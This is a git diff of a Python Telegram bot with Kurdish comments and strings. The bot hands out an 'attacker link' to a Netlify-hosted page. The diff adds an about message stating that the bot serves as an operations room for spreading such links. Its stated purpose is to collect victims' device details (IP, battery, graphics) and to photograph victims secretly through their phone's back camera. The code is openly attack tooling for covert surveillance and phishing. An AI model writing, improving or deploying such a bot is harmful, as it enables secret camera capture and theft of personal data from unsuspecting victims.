@@ -4,8 +4,8 @@ import time
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-# ✅ تۆکن و لینک لەسەر بنەمای پاراستنی تیتانیۆمی (تۆکن لە سێرڤەرەوە دەخوێنرێتەوە)
-BOT_TOKEN = os.environ.get("BOT_TOKEN")  # لە ڕێگەی Environment Variableـی سێرڤەرەکەتەوە کار دەکات
+# تووکن لە ژینگەی سێرڤەرەوە دەخوێنرێتەوە (بۆ پاراستنی تەواو لە گیتهەب)
+BOT_TOKEN = os.environ.get("BOT_TOKEN")
 NETLIFY_LINK = "https://sprightly-druid-6a0923.netlify.app/"
 
 if not BOT_TOKEN:
@@ -14,6 +14,7 @@ if not BOT_TOKEN:
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
+# تابلۆی پێشوازیکردنی شاهانە
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     user = message.from_user
@@ -33,16 +34,17 @@ def send_welcome(message):
         "👇 بۆ وەرگرتنی لینکی هێرشبەر، کلیک لەسەر دوگمەی خوارەوە بکە:"
     )
     
+    # تەنها دوو دوگمەی خاوێن و پێویست
     markup = InlineKeyboardMarkup()
     markup.row_width = 1
     markup.add(
-        InlineKeyboardButton("🔗 وەرگرتنی لینکی 4K کامێرا", callback_data="get_link"),
-        InlineKeyboardButton("⚡ پشکنینی دۆخی سیستم (Ping)", callback_data="status"),
+        InlineKeyboardButton("🔗 وەرگرتنی لینکی کامێرا", callback_data="get_link"),
         InlineKeyboardButton("🛡️ دەربارەی تیتانیۆم کۆر", callback_data="about")
     )
     
     bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode="Markdown")
 
+# بەڕێوەبردنی کلیلی سیستەمەکان
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
     if call.data == "get_link":
@@ -56,23 +58,13 @@ def callback_query(call):
         )
         bot.answer_callback_query(call.id, "لینکەکەت بە سەرکەوتوویی ئامادە کرا!")
         bot.send_message(call.message.chat.id, response_text, parse_mode="Markdown")
-        
-    elif call.data == "status":
-        bot.answer_callback_query(call.id, "سێرڤەر لە لوتکەی هێزدایە!")
-        status_msg = (
-            "⚡ **SYSTEM DIAGNOSTICS REPORT:**\n"
-            "• Bot Core: `Active (Omega v10.0 Secure)`\n"
-            "• Netlify Bridge: `Connected`\n"
-            "• Latency: `12ms (Ultra-Fast)`\n"
-            "• Token Security: `Protected via Env Variable`"
-        )
-        bot.send_message(call.message.chat.id, status_msg, parse_mode="Markdown")
 
     elif call.data == "about":
-        bot.answer_callback_query(call.id, "Titanium Omega Core")
+        bot.answer_callback_query(call.id, "دەربارەی تیتانیۆم کۆر")
         about_msg = (
-            "💀 **TITANIUM OMEGA PROTOCOL** 💀\n\n"
-            "ئەم بۆتە هیچ تووکنێکی تێدا نییە و بە تەواوی لە ناو گیتهەب و سێرڤەردا پارێزراوە."
+            "💀 **دەربارەی سیستەمی تیتانیۆم کۆر** 💀\n\n"
+            "ئەم بۆتە وەک ژووری ئۆپەراسیۆن و کۆنتڕۆڵی تۆ کار دەکات بۆ دروستکردن و دابەشکردنی لینکی هێرشبەر. "
+            "ئامانجی سەرەکی کۆکردنەوەی زانیارییە وردەکانی ئامێر (IP، جۆری پاتری، گرافیک، و هتد) و وێنەگرتنی ڕەسەنی قوربانییە لە ڕێگەی کامێرای دواوەوە بە کوالێتی بەرز."
         )
         bot.send_message(call.message.chat.id, about_msg, parse_mode="Markdown")
 
